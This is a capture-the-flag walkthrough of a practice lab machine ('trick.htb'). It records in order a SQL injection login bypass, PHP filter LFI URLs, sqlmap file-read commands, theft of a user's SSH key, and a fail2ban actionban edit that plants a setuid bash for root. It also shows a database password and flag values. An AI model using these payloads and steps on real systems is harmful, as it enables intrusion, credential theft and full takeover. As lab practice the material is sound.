# 10.10.11.166

## NMAP
```
PORT   STATE SERVICE
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Foothold
- SMTP uses `VRFY, RCPT TO` - found user `root`
- Tried directories/files - nothing worked
- tried subdomains/vhost - didnt work
- tried dns AXFR Zone transfer to find `preprod-payroll.trick.htb`
- logged in using a basic sql payload `admin' OR '1'='1'#`
- found usernames like - `John C Smith`, `Enemigosss`
    - none worked with SMTP
- the url has a page parameter that might have LFI
- Trying php filters
    1. `http://preprod-payroll.trick.htb/index.php?page=php://filter/read=convert.base64-encode/resource=users` - sends to db_connect
    2. `http://preprod-payroll.trick.htb/index.php?page=php://filter/read=convert.base64-encode/resource=db_connect`
    3. `http://preprod-payroll.trick.htb/index.php?page=php://filter/read=convert.base64-encode/resource=manage_user`

- DB_CONNECT
```
<?php

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```
- reading `manage_users.php` files we see that the page uses the get id parameter directly in the sql query.
```
<?php 
include 'db_connect.php'; 
if(isset($_GET['id'])){
	$qry = $conn->query("SELECT * FROM employee where id = ".$_GET['id'])->fetch_array();
	foreach($qry as $k => $v){
		$$k = $v;
	}
}
?>
```
- save the request in file and run `sqlmap -r manage_users.req`
    - we see union injection
    - `--dump` dumping the tables gives nothing
    - `--privilege` tells us that we have file privileges
    - reading `/etc/passwd` we see the user `michael`
    - trying to read website config files. we know its `nginx`
    - `sqlmap -r user.req --file-read=/etc/nginx/sites-enabled/default`
    - we see there is another site `preprod-marketing.trick.htb`
- reviewing `preprod-marketing.trick.htb`
    - we find the http://preprod-marketing.trick.htb/index.php?page=services.html
    - looks like another LFI
    - Sending it to Burp Scanner, we see LFI is detected.
    - Trying to search for `/home/michael/.ssh/id_rsa` as we know michael from mysql file enum
    - get `/home/michael/.ssh/id_rsa` and chmod 600
    - ssh as michael to get user.txt - 40c657fb78ea697b958d4594cec577b9

## Privesc
- `id` - `security(1002)`
- `sudo -l` - `/etc/init.d/fail2ban restart`
-

```
[openhab-auth]

filter = openhab
action = iptables-allports[name=NoAuthFailures]
logpath = /opt/openhab/logs/request.log
```
- https://juggernaut-sec.com/fail2ban-lpe/
- find misc options
```
bantime = 10s
findtime = 10s
maxretry = 5
```
- the file also says 
```
# YOU SHOULD NOT MODIFY THIS FILE.
#
# It will probably be overwritten or improved in a distribution update.
#
# Provide customizations in a jail.local file or a jail.d/customisation.local.
```
- checking for a `jail.d` folder that contains - 
jail.d/defaults-debian.conf
```
[sshd]
enabled = true
```
- ls -la `/etc/fail2ban` shows that the security group has read write access to the `action.d` folder
    - however, we cant edit the files
- `cp iptables-multiport.conf` to `/tmp` (a folder we have access to)
- make the below line changes:
```
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
```
- run `hydra -l root -P rockyou-10.txt 10.10.11.166 ssh`
- check `/tmp` for a suid enabled bash
- `/tmp/bash -p` to get root.txt - e1135d4987d517c90bcb79e6925507ad
